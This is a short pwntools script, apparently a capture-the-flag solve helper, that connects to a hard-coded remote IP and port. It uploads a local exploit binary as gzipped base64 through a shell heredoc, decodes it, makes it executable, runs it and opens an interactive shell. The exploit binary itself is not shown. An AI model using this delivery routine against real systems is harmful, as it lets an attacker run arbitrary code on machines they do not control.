# -*- coding: utf-8 -*-
from pwn import *
import os

context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp > ./exp.gz')
    # r.sendlineafter(cmd, 'cd /tmp')
    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
    r.sendlineafter(cmd, 'gunzip ./exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./exp')
    r.sendlineafter(cmd, './exp')
    r.interactive()


p = remote('210.30.97.133',28044)
# p = process('./start.sh')
exploit(p)